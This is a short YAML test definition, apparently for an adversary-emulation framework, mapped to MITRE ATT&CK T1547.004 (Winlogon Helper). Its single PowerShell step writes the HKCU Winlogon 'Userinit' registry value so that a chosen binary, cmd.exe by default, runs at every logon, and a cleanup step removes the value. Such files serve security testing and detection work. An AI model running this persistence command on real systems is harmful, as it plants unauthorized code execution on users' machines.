api_version: "2.0"
name: Winlogon Userinit Key Persistence - PowerShell
description: |
    PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.

    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
args:
    - name: binary_to_execute
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: fb32c935-ee2e-454b-8fa3-1c46b42e8dfb
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1547: Boot or Logon Autostart Execution'
    subtechniques:
        - 'T1547.004: Winlogon Helper DLL'
requirements:
    platforms:
        - os: windows
steps:
    - name: winlogon-userinit-key-persistence---powershell
      inline: |
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, {{.Args.binary_to_execute}}" -Force
      executor: powershell
      cleanup:
        inline: |
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
        executor: powershell
